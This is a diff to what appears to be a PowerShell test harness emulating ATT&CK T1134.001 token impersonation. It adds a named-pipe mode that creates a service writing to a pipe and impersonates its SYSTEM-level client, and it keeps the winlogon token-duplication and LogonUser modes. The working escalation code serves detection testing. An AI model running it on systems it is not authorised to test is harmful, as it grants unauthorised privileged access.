@@ -68,6 +68,33 @@ namespace AtomicTestHarnesses_T1134_001 {
         TokenImpersonation = 2
     }
 
+    [Flags]
+    public enum PipeOpenModeFlags : long
+    {
+        PIPE_ACCESS_DUPLEX = 0x00000003,
+        PIPE_ACCESS_INBOUND = 0x00000001,
+        PIPE_ACCESS_OUTBOUND = 0x00000002,
+        FILE_FLAG_FIRST_PIPE_INSTANCE = 0x00080000,
+        FILE_FLAG_WRITE_THROUGH = 0x80000000,
+        FILE_FLAG_OVERLAPPED = 0x40000000,
+        WRITE_DAC = 0x00040000L,
+        WRITE_OWNER = 0x00080000L,
+        ACCESS_SYSTEM_SECURITY = 0x01000000L
+    }
+
+    [Flags]
+    public enum PipeModeFlags : long
+    {
+        PIPE_TYPE_BYTE = 0x00000000,
+        PIPE_TYPE_MESSAGE = 0x00000004,
+        PIPE_READMODE_BYTE = 0x00000000,
+        PIPE_READMODE_MESSAGE = 0x00000002,
+        PIPE_WAIT = 0x00000000,
+        PIPE_NOWAIT = 0x00000001,
+        PIPE_ACCEPT_REMOTE_CLIENTS = 0x00000000,
+        PIPE_REJECT_REMOTE_CLIENTS = 0x00000008
+    }
+
     public class ProcessNativeMethods {
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern IntPtr OpenProcess(
@@ -99,10 +126,34 @@ namespace AtomicTestHarnesses_T1134_001 {
             LOGON_PROVIDER dwLogonProvider,
             ref IntPtr phToken 
             );
-
         [DllImport("advapi32.dll", SetLastError=true)]
             public static extern bool ImpersonateLoggedOnUser(
                 IntPtr hToken);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr CreateNamedPipe(
+            string lpName, 
+            PipeOpenModeFlags dwOpenMode,
+            PipeModeFlags dwPipeMode, 
+            uint nMaxInstances, 
+            uint nOutBufferSize, 
+            uint nInBufferSize,
+            uint nDefaultTimeOut, 
+            IntPtr lpSecurityAttributes);
+
+        [DllImport("kernel32.dll")]
+        public static extern bool ConnectNamedPipe(
+            IntPtr hNamedPipe,
+            IntPtr lpOverlapped);
+
+        [DllImport("advapi32.dll", SetLastError=true)]
+        public static extern bool ImpersonateNamedPipeClient(
+            IntPtr hHandle);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        public static extern bool DisconnectNamedPipe(
+            IntPtr hNamedPipe);
 
         [DllImport("kernel32.dll", SetLastError=true)]
             public static extern bool CloseHandle(
@@ -118,7 +169,6 @@ Add-Type -TypeDefinition $TypeDef
 function Invoke-ATHTokenImpersonation {
     <#
     .SYNOPSIS
-
     Test runner for token impersonation.
     
     Technique ID: T1134.001 (Token Impersonation/Theft)
@@ -139,6 +189,18 @@ function Invoke-ATHTokenImpersonation {
     
     Specifies the credential the user wants to pass through to the LogonUser API. 
     
+    .PARAMETER LogonToken
+    
+    Switch parameter that will specify to use the LogonToken parameter set.
+
+    .PARAMETER NamedPipe
+    
+    Switch parameter that will specify to use the NamedPipe parameter set.
+
+    .PARAMETER PipeName
+    
+    Specifies the name of the named pipe that will be created and used. 
+
     .PARAMETER LogonType
     
     Specifies the LogonType (Network or NewCredential) the user wants to use to logon the target user. 
@@ -146,27 +208,25 @@ function Invoke-ATHTokenImpersonation {
     .PARAMETER TestGuid
     
     Optionally, specify a test GUID value to use to override the generated test GUID behavior. 
-
+    
     .INPUTS
 
     System.Diagnostics.Process
-
     Invoke-ATHTokenImpersonation accepts the output of Get-Process. Only one Process object should be supplied to Invoke-ATHTokenImpersonation.
-
     Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_Process
-
     Invoke-ATHTokenImpersonation accepts the output of a Win32_Process WMI object via Get-CimInstance.
-
-
-    .OUTPUTS
-    PSObject
-
-    Outputs an object consisting of relevant execution details. The following object properties may be populated:
     
+    .OUTPUTS
+
+    PSObject
+    Outputs an object consisting of relevant execution details. The following object properties may be populated:
+
     * TechniqueID - Specifies the relevant MITRE ATT&CK Technique ID.
     * TestSuccess - Will be set to True if it was determined that the technique executed successfully. Invoke-ATHTokenImpersonation can identify when impersonation was successful by checking the security context of the current thread and confirming it is different then the original security context.
     * TestGuid - Specifies the test GUID that was used for the test.
     * TestCommand - Specifies the command-line arguments used to perform the test.
+    * PipeName - Indicates the name of the pipe that was created and called. 
+    * ServiceName - Indicates the name of the service that was created. 
     * SourceUser - Specifies the user that the current thread is running under before impersonation was performed.
     * SourceExecutableFilePath - Specifies the full path of the source executable. If the source executable is specified as a byte array, this property will be empty.
     * SourceExecutableFileHash - SHA256 hash of the source executable.
@@ -183,55 +243,68 @@ function Invoke-ATHTokenImpersonation {
     .EXAMPLE
 
     Get-Process -name notepad | Invoke-ATHTokenImpersonation
-
     Perform impersonation where notepad.exe is the target process.
 
     .EXAMPLE
 
     Invoke-ATHTokenImpersonation -AccessRights AllAccess
-
     Performs impersonation and specifying the access rights as AllAccess.
-
 
     .EXAMPLE
 
     Get-Process -name notepad | Invoke-ATHTokenImpersonation -AccessRights AllAccess
-
     Performs impersonation and specifying the target process as notepad and the  access rights as AllAccess.
 
     .EXAMPLE
 
     $cred = Get-Credential
-    Invoke-ATHTokenImpersonation -Credential $cred -LogonType Network
-
+    Invoke-ATHTokenImpersonation -LogonToken -Credential $cred -LogonType Network
     Logs in a user with legitimate credentials under a Network Logon (Type 3), then impersonates the logged on user. 
 
     .EXAMPLE
 
     $cred = Get-Credential
-    Invoke-ATHTokenImpersonation -Credential $cred -LogonType NewCredential
-
+    Invoke-ATHTokenImpersonation -LogonToken -Credential $cred -LogonType NewCredential
     Logs in a user with legitimate/illegitimate credentials under a NewCredential Logon (Type 9), then impersonates the logged on user. 
+
+    .EXAMPLE
+
+    Invoke-ATHTokenImpersonation -NamedPipe
+    Performs named pipe impersonation.
     #>
 
-    [CmdletBinding()]
+    [CmdletBinding(DefaultParameterSetName = 'Token')]
     param (
-        [Parameter(ValueFromPipelineByPropertyName)]
+
+        [Parameter(Mandatory, ParameterSetName = 'NamedPipe')]
+        [Switch]
+        $NamedPipe,
+
+        [Parameter(Mandatory, ParameterSetName = 'LogonToken')]
+        [Switch]
+        $LogonToken,
+
+        [Parameter(ValueFromPipelineByPropertyName, ParameterSetName = 'Token')]
         [Int32]
         [Alias('Id')]
         $ProcessId = (Get-Process -Name winlogon)[0].Id,
 
-        [Parameter()]
+        [Parameter(ParameterSetName = 'Token')]
         [string]
         [ValidateSet('AllAccess', 'QueryLimitedInformation', 'QueryInformation')]
         $AccessRights = 'QueryLimitedInformation',
 
-        [Parameter()]
+        [Parameter(ParameterSetName = 'NamedPipe')]
+        [string]
+        [ValidateNotNullOrEmpty()]
+        $PipeName = 'TestHarness', 
+
+        [Parameter(ParameterSetName = 'LogonToken')]
         [string]
         [ValidateSet('Network', 'NewCredential')]
         $LogonType = 'Network',
 
-        [Parameter()]
+        [Parameter(Mandatory, ParameterSetName = 'LogonToken')]
         [System.Management.Automation.PSCredential]
         $Credential,
         
@@ -246,191 +319,292 @@ function Invoke-ATHTokenImpersonation {
     $SourceProcessPath = $null
     $SourceProcessPath =  (Get-CimInstance -ClassName Win32_Process -Property ExecutablePath  -Filter "ProcessId=$PID").Path
 
-    if (-not ($PSBoundParameters.ContainsKey('Credential'))) {
-        $SourceUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-
-        $ProcessHandle = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::OpenProcess(
-            $AccessRights, 
-            $False,
-            $ProcessId
-        );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
-
-        if($ProcessHandle -eq [IntPtr]::Zero){
-            Write-Error $LastError
-            return
-        }
-
-        $TokenHandle = [IntPtr]::Zero
-        $TokenResult = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::OpenProcessToken(
-            $ProcessHandle,
-            'TokenDuplicate',
-            [Ref] $TokenHandle
-        );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
-
-        if($TokenResult -eq 0){
-            Write-Error $LastError
-            $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($ProcessHandle)
-            return
-        }
-
-        $hToken = [IntPtr]::Zero
-
-        $DuplicateToken = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::DuplicateTokenEx(
-            $TokenHandle,
-            'TokenQuery, TokenImpersonate',
-            [IntPtr]::Zero,
-            'SecurityImpersonation',
-            2, #TokenImpersonation
-            [ref]$hToken
-        );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
-
-        if($DuplicateToken -eq 0)
-        {
-            Write-Error $LastError
-            $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($ProcessHandle)
-            $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($TokenHandle)
-            return
-        }
-    }
-    else {
-
-        $split = $Credential.UserName.Split("\")
-        if ($split.Count -eq 2){
-            $Domain = $split[0]
-            $AccountName = $split[1]
-        }
-        else {
-            $AccountName = $split[0]
-        }
-        $LogonTypeCount =  (Get-CimInstance Win32_LogonSession -Filter 'LogonType = 9' | Measure-Object).Count
-
-        $SourceUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-        
-        $hToken = [IntPtr]::Zero
-
-        if ($LogonType -eq 'NewCredential') { 
-            $LogonTypeNumber = 9
-            $LogonProvider = 3
-        }
-        else {
-            $LogonTypeNumber = 3
-            $LogonProvider = 1
-        }
-
-        $LogonCreds = [System.Net.NetworkCredential]::new("", $Credential.Password).Password
-
-        $Logon = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::LogonUser(
-            $AccountName,
-            $Domain,
-            $LogonCreds,
-            $LogonTypeNumber,
-            $LogonProvider,
-            [ref]$hToken
-        );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
-
-        if($Logon -eq 0)
-        {
-            Write-Error $LastError
-            return
-        }
-    }
-
-    $Success = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::ImpersonateLoggedOnUser(
-        $hToken
-    );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
-
-    if($Success -eq 0){
-        Write-Error $LastError
-        $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($ProcessHandle)
-        $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($TokenHandle)
-        $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($DupToken)
-        return
-    }
-
-    if ($LogonType -eq 'NewCredential'){
-        $LogonTypeCountUpdate =  (Get-CimInstance Win32_LogonSession -Filter 'LogonType = 9' | Measure-Object).Count
-        $Current = [System.Security.Principal.WindowsIdentity]::GetCurrent().ImpersonationLevel
-        $TargetUser = $Credential.UserName
-        $TestSuccess = $null
-    
-        if($LogonTypeCount -ne $LogonTypeCountUpdate){
-            if ($Current -eq 'Impersonation'){
-                $TestSuccess = $true
-            } 
-        }
-    }
-    else {
-        $TargetUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-
-        $TestSuccess = $null
-    
-        if($SourceUser -ne $TargetUser){
-            if ($SourceUser -and $TargetUser)
-            {
-                $TestSuccess = $true
-            }
-        
-        }
-    }
-    
-    
     #Source Process Hash Logic: 
     $SHA256 = [Security.Cryptography.SHA256]::Create()
     $ResolvedSourceFilePath = Resolve-Path -Path $SourceProcessPath -ErrorAction Stop
     $SourceExeBytes = [IO.File]::ReadAllBytes($ResolvedSourceFilePath.Path)
     $SourceExeHash = ($SHA256.ComputeHash($SourceExeBytes) | ForEach-Object { $_.ToString('X2') }) -join ''
 
+    $SourceUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+
     #Running Command Information:
     $TestCommand = $MyInvocation
 
-    if (-not ($PSBoundParameters.ContainsKey('Credential'))) {
-        if ($PSBoundParameters.ContainsKey('LogonType')){
-            Write-Error "LogonType is not supported without the Credential parameter"
-            return
+    switch ($PSCmdlet.ParameterSetName) {
+        'Token'{
+            $ProcessHandle = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::OpenProcess(
+                $AccessRights, 
+                $False,
+                $ProcessId
+            );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+            if($ProcessHandle -eq [IntPtr]::Zero){
+                Write-Error $LastError
+                return
+            }
+
+            $TokenHandle = [IntPtr]::Zero
+            $TokenResult = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::OpenProcessToken(
+                $ProcessHandle,
+                'TokenDuplicate',
+                [Ref] $TokenHandle
+            );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+            if($TokenResult -eq 0){
+                Write-Error $LastError
+                $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($ProcessHandle)
+                return
+            }
+
+            $hToken = [IntPtr]::Zero
+
+            $DuplicateToken = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::DuplicateTokenEx(
+                $TokenHandle,
+                'TokenQuery, TokenImpersonate',
+                [IntPtr]::Zero,
+                'SecurityImpersonation',
+                2, #TokenImpersonation
+                [ref]$hToken
+            );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+            if($DuplicateToken -eq 0)
+            {
+                Write-Error $LastError
+                $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($ProcessHandle)
+                $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($TokenHandle)
+                return
+            }
+
+             $Success = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::ImpersonateLoggedOnUser(
+                $hToken
+            );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+            if($Success -eq 0){
+                Write-Error $LastError
+                $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($ProcessHandle)
+                $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($TokenHandle)
+                $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($hToken)
+                return
+            }
+
+            #Testing Logic
+            $TargetUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+            $TestSuccess = $null
+            if($SourceUser -ne $TargetUser){
+                if ($SourceUser -and $TargetUser)
+                {
+                    $TestSuccess = $true
+                }
+            }
+
+            #Target Process Hash Logic:
+            $TargetExecutablePath = $null
+            $TargetExecutablePath = (Get-CimInstance -ClassName Win32_Process -Property ExecutablePath  -Filter "ProcessId=$ProcessId").Path
+            $ResolvedTargetFilePath = Resolve-Path -Path $TargetExecutablePath -ErrorAction Stop
+            $TargetExeBytes = [IO.File]::ReadAllBytes($ResolvedTargetFilePath.Path)
+            $TargetExeHash = ($SHA256.ComputeHash($TargetExeBytes) | ForEach-Object { $_.ToString('X2') }) -join ''
+
+            [PSCustomObject] @{
+                TechniqueID              = 'T1134.001'
+                TestSuccess              = $TestSuccess
+                TestGuid                 = $TestGuid
+                TestCommand              = $TestCommand.Line
+                SourceUser               = $SourceUser
+                SourceExecutableFilePath = $SourceProcessPath
+                SourceExecutableFileHash = $SourceExeHash
+                SourceProcessId          = $PID
+                GrantedRights            = $AccessRights
+                ImpersonatedUser         = $TargetUser
+                TargetExecutableFilePath = $TargetExecutablePath
+                TargetExecutableFileHash = $TargetExeHash
+                TargetProcessId          = $ProcessId
+		        PipeName                =  $Null
+                ServiceName             =  $Null
+            }
+
+            #Cleanup
+            $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($ProcessHandle)
+            $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($TokenHandle)
+            $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($hToken)
+            
         }
-        $AccessRightsOutput = $AccessRights
-        #Target Process Hash Logic:
-        $TargetExecutablePath = $null
-        $TargetExecutablePath = (Get-CimInstance -ClassName Win32_Process -Property ExecutablePath  -Filter "ProcessId=$ProcessId").Path
-        $ResolvedTargetFilePath = Resolve-Path -Path $TargetExecutablePath -ErrorAction Stop
-        $TargetExeBytes = [IO.File]::ReadAllBytes($ResolvedTargetFilePath.Path)
-        $TargetExeHash = ($SHA256.ComputeHash($TargetExeBytes) | ForEach-Object { $_.ToString('X2') }) -join ''
+        'LogonToken'{
+                if  (-not ($PSBoundParameters.ContainsKey('Credential')))
+                {
+                    Write-Error "Function not supported unless credentials are passed through"
+                    return
+                }
 
-        $TargetProcessId = $ProcessId
+                $split = $Credential.UserName.Split("\")
+                if ($split.Count -eq 2){
+                    $Domain = $split[0]
+                    $AccountName = $split[1]
+                }
+                else {
+                    $AccountName = $split[0]
+                }
+                $LogonTypeCount =  (Get-CimInstance Win32_LogonSession -Filter 'LogonType = 9' | Measure-Object).Count
 
-        #Cleanup
-        $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($ProcessHandle)
-        $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($TokenHandle)
+                if ($LogonType -eq 'NewCredential') { 
+                    $LogonTypeNumber = 9
+                    $LogonProvider = 3
+                }
+                else {
+                    $LogonTypeNumber = 3
+                    $LogonProvider = 1
+                }
 
-    }
-    else {
-        $AccessRightsOutput = $null
-        $TargetExecutablePath = $null
-        $TargetExeHash = $null
-        $TargetProcessId = $null
-    
-    }    
+                $LogonCreds = [System.Net.NetworkCredential]::new("", $Credential.Password).Password
 
-         [PSCustomObject] @{
-            TechniqueID              = 'T1134.001'
-            TestSuccess              = $TestSuccess
-            TestGuid                 = $TestGuid
-            TestCommand              = $TestCommand.Line
-            SourceUser               = $SourceUser
-            SourceExecutableFilePath = $SourceProcessPath
-            SourceExecutableFileHash = $SourceExeHash
-            SourceProcessId          = $PID
-            GrantedRights            = $AccessRightsOutput
-            ImpersonatedUser         = $TargetUser
-            TargetExecutableFilePath = $TargetExecutablePath
-            TargetExecutableFileHash = $TargetExeHash
-            TargetProcessId          = $TargetProcessId
+                $hToken = [IntPtr]::Zero
+                $Logon = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::LogonUser(
+                    $AccountName,
+                    $Domain,
+                    $LogonCreds,
+                    $LogonTypeNumber,
+                    $LogonProvider,
+                    [ref]$hToken
+                );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+                if($Logon -eq 0)
+                {
+                    Write-Error $LastError
+                    return
+                }
+
+                
+                $Success = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::ImpersonateLoggedOnUser(
+                    $hToken
+                );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+                switch ($LogonType){
+                    'NewCredential' {
+                        $LogonTypeCountUpdate =  (Get-CimInstance Win32_LogonSession -Filter 'LogonType = 9' | Measure-Object).Count
+                        $Current = [System.Security.Principal.WindowsIdentity]::GetCurrent().ImpersonationLevel
+                        $TargetUser = $Credential.UserName
+                        
+                        #Testing Logic
+                        if($LogonTypeCount -ne $LogonTypeCountUpdate){
+                            if ($Current -eq 'Impersonation'){
+                                $TestSuccess = $true
+                            } 
+                        }
+                    }
+                    'Network' {
+                        #Testing Logic
+                        $TargetUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+                        $TestSuccess = $null
+                        if($SourceUser -ne $TargetUser){
+                            if ($SourceUser -and $TargetUser)
+                            {
+                                $TestSuccess = $true
+                            }
+                        }
+                    }
+                }
+                
+                #Cleanup   
+                $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($hToken)
+
+                [PSCustomObject] @{
+                    TechniqueID              = 'T1134.001'
+                    TestSuccess              = $TestSuccess
+                    TestGuid                 = $TestGuid
+                    TestCommand              = $TestCommand.Line
+                    SourceUser               = $SourceUser
+                    SourceExecutableFilePath = $SourceProcessPath
+                    SourceExecutableFileHash = $SourceExeHash
+                    SourceProcessId          = $PID
+		            GrantedRights            = $Null
+                    ImpersonatedUser         = $TargetUser
+		            TargetExecutableFilePath = $Null
+                    TargetExecutableFileHash = $Null
+                    TargetProcessId          = $Null
+		            PipeName                =  $Null
+                    ServiceName             =  $Null
+                }
         }
+       
+        'NamedPipe'{
+            $pHandle = [IntPtr]::Zero
+            $pHandle = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CreateNamedPipe(
+                "\\.\pipe\$PipeName", 
+                'PIPE_ACCESS_DUPLEX', 
+                'PIPE_TYPE_BYTE, PIPE_WAIT', 
+                10, 
+                2048, 
+                2048, 
+                0, 
+                [IntPtr]::Zero
+            );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
-    #Cleanup   
-    $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($hToken)
+            if($pHandle -eq [IntPtr]::Zero){
+                Write-Error $LastError
+                return
+            }
+            #Creating Service
+            $null = sc.exe create TestHarness binpath= "%COMSPEC% /C echo TestHarnessTest > \\127.0.0.1\pipe\$PipeName" 
+            Start-Process -NoNewWindow -FilePath powershell.exe -ArgumentList 'Start-Sleep -Seconds 8; $null = sc.exe start TestHarness'
+
+            $Success = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::ConnectNamedPipe(
+                $pHandle,
+                [IntPtr]::Zero
+            );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+            if($Success -eq 0){
+                Write-Error $LastError
+                return
+            }
+
+            $Impersonate = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::ImpersonateNamedPipeClient(
+                $pHandle
+            );$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
+
+            if($Impersonate -eq 0){
+                Write-Error $LastError
+                $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::DisconnectNamedPipe($pHandle)
+                $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($pHandle)
+                return
+            }
+
+            $TargetUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+
+            $TestSuccess = $null
+            
+                if($SourceUser -ne $TargetUser){
+                    if ($SourceUser -and $TargetUser)
+                    {
+                        $TestSuccess = $true
+                    }
+                
+                }
+            #Cleanup
+            $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::DisconnectNamedPipe($pHandle)
+            $null = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::CloseHandle($pHandle)
+            $null = sc.exe delete TestHarness 
+
+            [PSCustomObject] @{
+                TechniqueID              = 'T1134.001'
+                TestSuccess              = $TestSuccess
+                TestGuid                 = $TestGuid
+                TestCommand              = $TestCommand.Line
+                SourceUser               = $SourceUser
+                SourceExecutableFilePath = $SourceProcessPath
+                SourceExecutableFileHash = $SourceExeHash
+                SourceProcessId          = $PID
+		        GrantedRights            = $Null
+                ImpersonatedUser         = $TargetUser
+		        TargetExecutableFilePath = $Null
+                TargetExecutableFileHash = $Null
+                TargetProcessId          = $Null
+		        PipeName                =  $PipeName
+                ServiceName             =  'TestHarness'
+            }
+        }
+    }  
+
+    #Cleanup
     $Revert = [AtomicTestHarnesses_T1134_001.ProcessNativeMethods]::RevertToSelf();$LastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
-
     if($Revert -eq 0){
         Write-Error $LastError
         return
